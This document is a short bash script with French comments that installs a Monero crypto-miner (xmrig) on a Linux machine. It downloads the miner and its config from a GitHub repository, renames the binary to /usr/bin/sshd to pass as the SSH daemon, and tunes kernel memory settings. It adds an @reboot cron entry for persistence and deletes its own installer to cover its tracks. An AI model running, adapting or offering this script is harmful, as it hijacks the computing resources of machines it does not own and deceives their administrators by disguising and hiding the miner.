#!/bin/bash

#le nom
nom=$(cat /etc/hostname | head -1)

#wget le miner
wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.tgz"

#decompresse
tar -zxvf xmrig.tgz
mv minerd /usr/bin/sshd

#wget la config
wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.json"
mkdir /root/.config
sed -i "s/nom_machine/$nom/g" xmrig.json
mv xmrig.json /root/.config/xmrig.json

#lancement
echo 3 > /proc/sys/vm/drop_caches
echo 1 > /proc/sys/vm/compact_memory
echo always > /sys/kernel/mm/transparent_hugepage/enabled
/usr/bin/sshd

#crontab
crontab -l > mycron
echo "@reboot /usr/bin/sshd" >> mycron
crontab mycron
rm mycron

#netoyage
rm xmrig.tgz
rm install.sh
